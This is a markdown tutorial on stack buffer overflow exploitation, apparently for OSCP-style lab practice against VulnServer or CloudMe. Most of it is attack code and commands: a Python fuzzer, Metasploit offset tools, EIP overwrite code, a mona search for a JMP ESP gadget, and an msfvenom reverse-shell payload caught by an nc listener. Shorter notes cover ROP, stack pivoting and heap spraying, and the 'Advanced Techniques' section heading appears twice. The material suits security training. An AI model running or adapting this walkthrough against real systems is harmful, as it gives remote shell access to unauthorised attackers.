# Buffer Overflow Exploitation Guide (Beginner to Advanced)

## Introduction
A **buffer overflow** occurs when a program writes more data to a buffer than it can hold, overwriting adjacent memory and potentially allowing an attacker to control execution flow. This guide will take you from basic concepts to advanced exploitation techniques.

---

## 1️⃣ Understanding Buffer Overflows
### **How It Works**
1. A buffer (fixed-size memory) is allocated for input.
2. The program does not check input length, allowing excess data to **overflow into adjacent memory**.
3. If the overflow reaches the **EIP (Extended Instruction Pointer)**, an attacker can **control execution flow**.

### **Key Registers**
- **EIP** – Stores the address of the next instruction to execute.
- **ESP** – Points to the top of the stack.
- **EBP** – Base pointer for stack frames.

---

## 2️⃣ Finding a Vulnerable Application
To practice, download **VulnServer** (Windows) or **CloudMe**.

1. **Run the vulnerable application**:
   ```bash
   ./cloudme.exe
   ```
2. Identify the vulnerable buffer.

---

## 3️⃣ Fuzzing to Find the Crash
Use **Python** to send increasing input sizes and observe crashes.

```python
import socket

target = "127.0.0.1"
port = 8888

for i in range(100, 3000, 100):
    try:
        print(f"Sending {i} bytes")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(b"A" * i)
        s.close()
    except:
        print("Crashed at", i)
        break
```

---

## 4️⃣ Finding the Offset
Use Metasploit's **pattern_create** to generate unique input:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```
Copy the generated pattern, send it as input, and note the **EIP overwrite value** in a debugger.

Find the exact offset:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_VALUE>
```

Example output: `Offset found at 1052 bytes`

---

## 5️⃣ Controlling EIP
Modify the exploit to overwrite **EIP** with a controlled value:

```python
buffer = b"A" * 1052  # Offset found earlier
EIP = b"B" * 4         # EIP overwrite
payload = buffer + EIP
```

Run the script and check if EIP becomes `42424242` (`BBBB` in hex).

---

## 6️⃣ Finding a JMP ESP Instruction
Use **Immunity Debugger + Mona.py**:
```text
!mona modules
```
Find a module with **no ASLR/DEP** and locate `JMP ESP`:
```text
!mona find -s "\xff\xe4" -m vulnapp.dll
```
Example output: `0x625011AF`

Modify the exploit:
```python
EIP = b"\xAF\x11\x50\x62"  # JMP ESP (little endian)
```

---

## 7️⃣ Injecting Shellcode
Generate shellcode using **msfvenom**:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -b "\x00" -f python
```

Modify exploit:
```python
nop_sled = b"\x90" * 16  # NOP slide
shellcode = b"<Generated shellcode>"
payload = buffer + EIP + nop_sled + shellcode
```

Start a listener:
```bash
nc -lvnp 4444
```
Execute the exploit and get a shell!

---

## 8️⃣ Advanced Techniques
- **Stack pivoting** to bypass mitigations
- **Return-Oriented Programming (ROP)** for DEP bypass
- **Heap-based buffer overflows**
---

## 8️⃣ Advanced Techniques
### **Stack Pivoting**
Stack pivoting is used when we don't have direct control over ESP. We overwrite EIP with an address that points to a **ROP gadget** that moves ESP to a controlled buffer.

Example:
```assembly
XCHG ESP, EAX  ; Exchange stack pointer with controlled register
RET
```
Use `!mona rop` in Immunity Debugger to find useful gadgets.

### **Return-Oriented Programming (ROP) for DEP Bypass**
If **DEP (Data Execution Prevention)** is enabled, traditional shellcode execution fails. **ROP chains** execute small instruction sequences ending in `RET` to bypass DEP.

- Use **ROP gadgets** to call `VirtualProtect()` and mark shellcode memory as executable.
- Tools like **ROPgadget** or **Mona.py** help build ROP chains.

Example to find ROP gadgets:
```bash
ROPgadget --binary vulnapp.exe
```

### **Heap-Based Buffer Overflow**
Instead of overflowing the stack, this attack targets heap memory. **Use-after-free** vulnerabilities or **heap spraying** techniques are common ways to exploit heap-based overflows.

Example technique:
- Spray memory with NOP sleds + shellcode.
- Corrupt function pointers or overwrite heap metadata.

Tools like **Heap Explorer** and **GDB-peda** help analyze heap structures.

---

## **Conclusion**
Buffer overflows are a fundamental exploit technique. Start with **basic stack overflows**, then move to **bypassing protections** like ASLR, DEP, and stack canaries.

🚀 Keep practicing with **OSCP-style machines** like `Brainpan`, `Alpha`, and `VulnServer`!